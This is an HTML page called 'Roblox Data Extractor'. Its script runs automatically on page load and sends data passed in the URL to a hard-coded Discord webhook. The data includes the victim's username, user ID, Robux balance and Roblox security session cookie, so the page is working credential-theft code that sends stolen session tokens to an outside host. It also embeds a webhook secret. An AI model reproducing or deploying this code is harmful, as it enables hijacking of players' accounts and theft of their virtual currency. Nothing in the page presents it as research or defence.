<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Data Extractor</title>
    <script>
        function getQueryParam(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        function sendWebhook(message) {
            const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
            
            const embed = {
                "embeds": [{
                    "title": "Roblox Data Extracted",
                    "fields": [
                        {
                            "name": "Username",
                            "value": message.username,
                            "inline": true
                        },
                        {
                            "name": "UserID",
                            "value": message.userid.toString(),
                            "inline": true
                        },
                        {
                            "name": "Robux",
                            "value": message.robux.toString(),
                            "inline": true
                        },
                        {
                            "name": "Job ID",
                            "value": message.job,
                            "inline": true
                        },
                        {
                            "name": "Teleport Info",
                            "value": message.teleport,
                            "inline": false
                        },
                        {
                            "name": "Roblox Security Cookie",
                            "value": message.robloxSecurity || "Not Available",
                            "inline": false
                        }
                    ],
                    "image": {
                        "url": message.headshot
                    },
                    "footer": {
                        "text": "Roblox Data Extractor"
                    }
                }]
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(embed)
            }).then(response => {
                if (response.ok) {
                    console.log('Webhook sent successfully');
                } else {
                    console.error('Error sending webhook:', response);
                }
            }).catch(error => {
                console.error('Request failed', error);
            });
        }

        function extractData() {
            const data = getQueryParam('data');
            if (data) {
                try {
                    const message = JSON.parse(decodeURIComponent(data));
                    sendWebhook(message); // Send the extracted data to the webhook
                } catch (error) {
                    console.error('Error parsing data:', error);
                }
            }
        }

        window.onload = extractData; // Automatically send the webhook when the page is loaded
    </script>
</head>
<body>
</body>
</html>
